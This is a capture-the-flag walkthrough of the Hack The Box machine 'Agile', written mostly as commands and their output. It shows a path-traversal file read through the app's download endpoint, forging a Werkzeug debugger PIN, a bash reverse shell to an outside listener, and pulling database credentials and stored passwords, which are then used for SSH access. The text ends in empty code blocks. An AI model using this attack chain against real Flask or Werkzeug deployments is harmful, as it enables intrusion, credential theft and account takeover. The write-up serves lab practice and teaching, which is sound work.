# Agile

```bash
TARGET=10.10.11.203
```

```bash
$ sudo nmap -v -sC -sV $TARGET 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-23 19:35 PDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
...
Scanning 10.10.11.203 [4 ports]
...
Scanning 10.10.11.203 [1000 ports]
Discovered open port 22/tcp on 10.10.11.203
Discovered open port 80/tcp on 10.10.11.203
...
Nmap scan report for 10.10.11.203
Host is up (0.096s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f4:bc:ee:21:d7:1f:1a:a2:65:72:21:2d:5b:a6:f7:00 (ECDSA)
|_  256 65:c1:48:0d:88:cb:b9:75:a0:2c:a5:e6:37:7e:51:06 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://superpass.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 19:36
Completed NSE at 19:36, 0.00s elapsed
Initiating NSE at 19:36
Completed NSE at 19:36, 0.00s elapsed
Initiating NSE at 19:36
Completed NSE at 19:36, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.50 seconds
           Raw packets sent: 1156 (50.840KB) | Rcvd: 1001 (40.048KB)
```

```bash
$ curl -I $TARGET          
HTTP/1.1 301 Moved Permanently
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 24 Jun 2024 02:36:19 GMT
Content-Type: text/html
Content-Length: 178
Connection: keep-alive
Location: http://superpass.htb
```

```bash
$ cat /etc/hosts | grep $TARGET 
10.10.11.203    superpass.htb
```

![Home](images/port_80_home.png)

![Login/Register](images/port_80_login_page.png)

After registering for a new user and login, we can create and export passwords

![Vaults](images/port_80_vaults.png)

![Burp Export](images/port_80_burp_export.png)

![Burp LFI](images/port_80_LFI.png)

![Burp LFI](images/port_80_LFI_passwd.png)

```bash
$ curl --path-as-is -i -s -k -X $'GET' \
    -H $'Host: superpass.htb' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Connection: keep-alive' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'session=.eJwlTsuKwzAM_BWjc1lsx5KjfEXvSymWIzeB9EGcnkr_fQU7l2EeDPOBa9tKX7TD9PsBdxjBXXsvN4UTnDctXd32vLn14Y6nK7Va6I5l7e5lnR-4fC8nG9m1LzAd-1tNrTNMIKWSDqnGlBoHL4hlDMJVm2LlKj60gRPnEcViHEk9a_YzKmaDCHKMKi0POYxEIsTszebISRKlRIg-I7FQ9LlFLpKCD6RkuuFs96_vrvv_G4bvH7XuRMs.Znjerw.c8mYkBgRvnDmdDZ7z1SUhR3GYRw; remember_token=9|fd28b85a6634750a15973d2744a9332c5b90df81d7e0ec07e607f6ab830331b3deb216d40783f8786553968235f9bd88e68864135e7e6743ba4552f0ee8cc593' \
    $'http://superpass.htb/download?fn=../etc/passwd' | grep 'sh$'

root:x:0:0:root:/root:/bin/bash
corum:x:1000:1000:corum:/home/corum:/bin/bash
runner:x:1001:1001::/app/app-testing/:/bin/sh
edwards:x:1002:1002::/home/edwards:/bin/bash
dev_admin:x:1003:1003::/home/dev_admin:/bin/bash
```

The app is constantly failing and seems to be redeploying. We see errors like the following.

![Error](images/port_80_mysql_error.png)

Also we can force the debug page make a request as the following

```bash
http://superpass.htb/download?fn=dsadsa
```

This is `Werkzeug` debugger and if we click on the stacks we get a prompt to provide a PIN.

![Debugger PIN](images/port_80_debug_pin.png)

[Hacktricks - Werkzeug](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug#werkzeug-console-pin-exploit) link has a nice explanation on how to hack this PIN. There is also this [video from 0xdf](https://www.youtube.com/watch?v=6BWaea0nfE0) that gives an nice explanation about how the app(debug) generates this PIN.

There is a script on the page to help generate the PIN, but we need to change a few things.

```python
...
probably_public_bits = [
    'web3_user',  # username
    'flask.app',  # modname
    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
    '279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
    'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]
...
```

`/proc/self/environ` = `www-data`

![username](images/port_80_debug_pin_username.png)

```python
...
probably_public_bits = [
    'www-data',  # username
    'flask.app',  # modname
    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]
...
```

Back on the error msg we can get the other values for the `probably_public_bits`

![app name](images/port_80_debug_pin_appname.png)

`/app/venv/lib/python3.10/site-packages/flask/app.py` and `wsgi_app`

```python
...
probably_public_bits = [
    'www-data',  # username
    'flask.app',  # modname
    'wsgi_app',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/app/venv/lib/python3.10/site-packages/flask/app.py'  # getattr(mod, '__file__', None),
]
...
```

We still need info for the `private_bits` part of the code.

```python
...
private_bits = [
    '279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
    'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]
...
```

Lets simplify our `curl` to be able to reuse it. We need to get `/proc/net/arp` to see the nic devices on the machine, and `/sys/class/net/[device]/address` of the nic to be able to get the MAC Address.

```bash
$ cookie="session=.eJwlTsuKwzAM_BWjc1lsx5KjfEXvSymWIzeB9EGcnkr_fQU7l2EeDPOBa9tKX7TD9PsBdxjBXXsvN4UTnDctXd32vLn14Y6nK7Va6I5l7e5lnR-4fC8nG9m1LzAd-1tNrTNMIKWSDqnGlBoHL4hlDMJVm2LlKj60gRPnEcViHEk9a_YzKmaDCHKMKi0POYxEIsTszebISRKlRIg-I7FQ9LlFLpKCD6RkuuFs96_vrvv_G4bvH7XuRMs.Znjerw.c8mYkBgRvnDmdDZ7z1SUhR3GYRw; remember_token=9|fd28b85a6634750a15973d2744a9332c5b90df81d7e0ec07e607f6ab830331b3deb216d40783f8786553968235f9bd88e68864135e7e6743ba4552f0ee8cc593"

$ curl -s --path-as-is -b $cookie http://superpass.htb/download?fn=../proc/net/arp 
IP address       HW type     Flags       HW address            Mask     Device
10.10.10.2       0x1         0x2         00:50:56:b9:ad:f7     *        eth0

$ curl -s --path-as-is -b $cookie http://superpass.htb/download?fn=../sys/class/net/eth0/address
00:50:56:b0:13:52
```

Lets convert the MAC address using python

```bash
$ python3
Python 3.11.8 (main, Feb  7 2024, 21:52:08) [GCC 13.2.0] on linux
...
>>> int("00:50:56:b0:13:52".replace(':',''), 16)
345051763538
```

The next item is a combination of a couple files. First, I need `/etc/machine-id`

```bash
$ curl -s --path-as-is -b $cookie http://superpass.htb/download?fn=../etc/machine-id
ed5b159560f54721827644bc9b220d00
```

And the first line of `/proc/self/cgroup`, from the last “/” to the end

```bash
$ curl -s --path-as-is -b $cookie http://superpass.htb/download?fn=../proc/self/cgroup
0::/system.slice/superpass.service
```

In this case `superpass.service`

Back to  `private_bits`, we will have the following.

```python
...
private_bits = [
    '345051763538',  # str(uuid.getnode()),  /sys/class/net/ens33/address
    'ed5b159560f54721827644bc9b220d00superpass.service'  # get_machine_id(), /etc/machine-id
]
...
```

Now we can run the script we got from HackTricks.

```bash
$ python3 genpin.py 
540-279-291
```

![Good PIN](images/port_80_debug_pin_good.png)

![Debug Console](images/port_80_debug_py_console.png)

![Shell](images/port_80_shell.png)

```bash
$ rlwrap -cAr nc -nlvp 9001
listening on [any] 9001 ...
```

```bash
import os; os.system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.3/9001 0>&1'")
```

![Reverse Shell](images/port_80_revshell.png)

```bash
$ rlwrap -cAr nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.203] 33584
bash: cannot set terminal process group (1073): Inappropriate ioctl for device
bash: no job control in this shell
(venv) www-data@agile:/app/app$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
export TERM=xterm
Ctrl z
stty raw -echo; fg
```

```bash
(venv) www-data@agile:/app/app$ cat superpass/app.py | grep config
...
def load_config():
    config_path = os.getenv("$")
    with open(config_path, 'r') as f:
            app.config[k] = v
...
```

```bash
(venv) www-data@agile:/app/app$ env
env
SERVER_SOFTWARE=gunicorn/20.1.0
PWD=/app/app
LOGNAME=www-data
SYSTEMD_EXEC_PID=1073
HOME=/var/www
LANG=C.UTF-8
VIRTUAL_ENV=/app/venv
CONFIG_PATH=/app/config_prod.json
INVOCATION_ID=24b6e873b7104fc89642217d2e678fbd
TERM=xterm
USER=www-data
SHLVL=3
VIRTUAL_ENV_PROMPT=(venv) 
PS1=(venv) ${debian_chroot:+($debian_chroot)}\u@\h:\w\$ 
JOURNAL_STREAM=8:32583
PATH=/app/venv/bin:/app/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
_=/usr/bin/env
```

```bash
venv) www-data@agile:/app/app$ cat /app/config_prod.json
cat /app/config_prod.json
{"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"}
```

| Username | Password | Target |
| -- | -- | -- |
| superpassuser | dSA6l7q*yIVs$39Ml6ywvgK | Mysql |

```bash
(venv) www-data@agile:/app/app$ mmysql -u superpassuser -p
Enter password: dSA6l7q*yIVs$39Ml6ywvgK

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 188
Server version: 8.0.32-0ubuntu0.22.04.2 (Ubuntu)
...
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```

```bash
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| performance_schema |
| superpass          |
+--------------------+

mysql> use superpass;
Database changed

mysql> show tables;
+---------------------+
| Tables_in_superpass |
+---------------------+
| passwords           |
| users               |
+---------------------+
2 rows in set (0.00 sec)

mysql> SELECT url, username, password FROM passwords;
+----------------+----------+----------------------+
| url            | username | password             |
+----------------+----------+----------------------+
| hackthebox.com | 0xdf     | 762b430d32eea2f12970 |
| mgoblog.com    | 0xdf     | 5b133f7a6a1c180646cb |
| mgoblog        | corum    | 47ed1e73c955de230a1d |
| ticketmaster   | corum    | 9799588839ed0f98c211 |
| agile          | corum    | 5db7caa1d13cc37c9fc2 |
+----------------+----------+----------------------+
5 rows in set (0.00 sec)
```

```bash
$ netexec ssh $TARGET -u corum -p 5db7caa1d13cc37c9fc2             
SSH         10.10.11.203    22     10.10.11.203     [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1
SSH         10.10.11.203    22     10.10.11.203     [+] corum:5db7caa1d13cc37c9fc2  (non root) Linux - Shell access!
```

```bash
```

```bash
```

```bash
```

```bash
```

```bash
```
